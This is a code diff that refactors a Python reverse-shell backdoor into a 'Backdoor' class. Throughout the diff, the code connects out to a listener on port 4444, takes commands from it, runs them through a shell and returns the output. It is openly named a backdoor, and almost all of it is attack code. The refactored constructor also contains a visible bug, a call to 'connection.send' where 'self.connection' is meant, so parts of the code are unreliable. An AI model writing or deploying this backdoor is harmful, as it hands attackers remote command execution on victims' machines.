@@ -27,33 +27,40 @@ import socket
 import subprocess
 
 
-def execute_system_command(command):
-    """
-    Execute a system command.
+class Backdoor:
+    def __init__(self, ip, port):
+        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # (ip of destination, port opened in target)
+        self.connection.connect((ip, port))
+        # send data
+        connection.send("\n[+] Connection established.\n")
 
-    :param command: command that we want to execute
-    :type command: str
-    :return: resulting command 
-    :rtype: str
-    """
-    return subprocess.check_output(command, shell=True)
+
+    def execute_system_command(self, command):
+        """
+        Execute a system command.
+    
+        :param command: command that we want to execute
+        :type command: str
+        :return: resulting command 
+        :rtype: str
+        """
+        return subprocess.check_output(command, shell=True)
+
+    def run(self):
+        """
+        Run the backdoor program.
+        """
+        while True:
+            command = self.connection.recv(1024)
+            # execute command
+            command_result = self.execute_system_command(command)
+            self.connection.send(command_result)
+        self.connection.close()
 
 
 if __name__ == "__main__":
     # TODO: set ip_address to local ip address
     ip_address = ""
-    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    # (ip of destination, port opened in target)
-    connection.connect((ip_address, 4444))
-
-    # send data
-    connection.send("\n[+] Connection established.\n")
-
-    # receive data
-    while True:
-        received_command = connection.recv(1024)
-        # execute command
-        command_result = execute_system_command(received_command)
-        connection.send(command_result)
-
-    connection.close()
+    backdoor = Backdoor(ip_address, 4444)
+    backdoor.run()
